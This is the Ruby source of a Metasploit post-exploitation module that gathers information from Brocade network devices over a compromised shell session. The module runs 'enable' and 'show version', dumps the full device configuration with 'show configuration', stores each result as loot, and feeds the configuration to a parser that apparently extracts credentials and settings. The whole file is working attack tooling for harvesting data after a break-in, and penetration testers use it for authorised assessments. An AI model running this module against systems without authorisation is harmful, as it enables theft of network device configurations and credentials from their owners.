##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/brocade'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Brocade
  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Brocade Gather Device General Information',
      'Description'   => %q{
        This module collects Brocade device information and configuration.
        },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'h00die'],
      'Platform'      => [ 'brocade'],
      'SessionTypes'  => [ 'shell' ]
    ))

    register_options([])

  end

  def run
    # Get device prompt
    prompt = session.shell_command("")

    if prompt.end_with?('(config)#') # config shell
      vprint_status('In a config cli')
    elsif prompt.end_with?('#') # regular cli shell (non-config)
      vprint_status('In an enabled cli')
    elsif prompt.end_with?('>') # cli not enabled
      vprint_status('In a non-enabled cli')
      session.shell_command('enable') # gets us back to the cli non-config
    end

    # disable paging
    session.shell_write('skip-page-display')

    # Get version info
    print_status('Getting version information')
    version_out = session.shell_command('show version')

    if /^, Version: (?<ver>.+) /i =~ version_out
      vprint_status("OS: #{ver}")
    end

    ver_loc = store_loot('brocade.version',
      'text/plain',
      session,
      version_out.strip,
      'version.txt',
      'Brocade Version')

    # Print the version of VERBOSE set to true.
    vprint_good("Version information stored in to loot #{ver_loc}")

    # run additional information gathering
    enum_configs(prompt)
  end

  # run commands found in exec mode under privilege 1
  def enum_configs(prompt)
    host,port = session.session_host, session.session_port
    exec_commands = [
      {
        'cmd'  => 'show configuration',
        'fn'   => 'get_config',
        'desc' => 'Get Device Config on Brocade Device'
      },
    ]
    exec_commands.each do |ec|
      command = command_prefix + ec['cmd']
      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/,"")
      print_status("Gathering info from #{command}")
      cmd_loc = store_loot("brocade.#{ec['fn']}",
        "text/plain",
        session,
        cmd_out.strip,
        "#{ec['fn']}.txt",
        ec['desc'])
      vprint_good("Saving to #{cmd_loc}")
      if ec['fn'] == 'get_config'
        brocades_config_eater(host,port,cmd_out.strip)
      end
    end
  end
end

